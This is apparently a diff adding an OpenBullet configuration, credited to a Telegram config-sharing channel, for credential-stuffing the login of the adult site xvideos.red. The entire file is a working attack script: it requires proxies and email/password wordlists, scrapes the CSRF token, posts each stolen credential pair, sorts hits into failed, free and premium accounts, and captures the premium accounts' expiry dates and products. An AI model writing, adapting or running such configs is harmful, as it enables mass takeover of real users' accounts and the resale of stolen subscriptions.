@@ -1,0 +1,92 @@
+[SETTINGS]
+{
+  "Name": "XVideos.Red ",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2020-11-14T09:15:08.9188627-08:00",
+  "AdditionalInfo": "",
+  "Author": "@OpenbulletConfigsOfficial",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GUID FUNCTION GenerateGUID -> VAR "1" 
+
+REQUEST GET "https://www.xvideos.red/account/signinform" 
+  
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "DNT: 1" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.xvideos.red/account/" 
+  HEADER "Accept-Language: en,en-US;q=0.9,ar;q=0.8" 
+
+#token PARSE "<SOURCE>" LR "\" id=\\\"signin-form_post_referer\\\" \\/>\\n" "\\\" name=\\\"signin-form[csrf_token]" -> VAR "csrf_token" 
+
+#csrf_token FUNCTION Replace "<input type=\\\"hidden\\\" value=\\\"" "" "<csrf_token>" -> VAR "csrf_token" 
+
+#pms PARSE "<SOURCE>" LR "id=\\\"signin-form_csrf_token\\\" \\/>\\n" "\\\" name=\\\"signin-form[pms]\\\"" -> VAR "post_referer" 
+
+#post_referer FUNCTION Replace "<input type=\\\"hidden\\\" value=\\\"" "" "<post_referer>" -> VAR "post_referer" 
+
+#login REQUEST POST "https://www.xvideos.red/account/signinform" 
+  CONTENT "signin-form%5Bvotes%5D=&signin-form%5Bsubs%5D=&signin-form%5Bpost_referer%5D=https%3A%2F%2Fwww.xvideos.red%2Faccount%2F&signin-form%5Bcsrf_token%5D=<csrf_token>&signin-form%5Bpms%5D=<post_referer>&signin-form%5Blogin%5D=<USER>&signin-form%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Host: www.xvideos.red" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "DNT: 1" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://www.xvideos.red" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.xvideos.red/account/" 
+  HEADER "Accept-Language: en,en-US;q=0.9,ar;q=0.8" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"form_valid\":false,\"form_displayed\":\"signin\",\"form\":\"<div id=\\\"premium-popup-signin\\\">\\n" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"is_premium\":false" 
+  KEYCHAIN Success OR 
+    KEY "premium\":true" 
+
+REQUEST GET "https://www.xvideos.red/account/premium" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Expires PARSE "<SOURCE>" LR ">XVIDEOS RED</strong> status:" "<small>" CreateEmpty=FALSE -> CAP "Expires On" 
+
+#Products PARSE "<SOURCE>" LR "<small>" "</small>" CreateEmpty=FALSE -> CAP "Products" "" " | Config Made By TG- @openbulletconfigsofficial" 
+
+
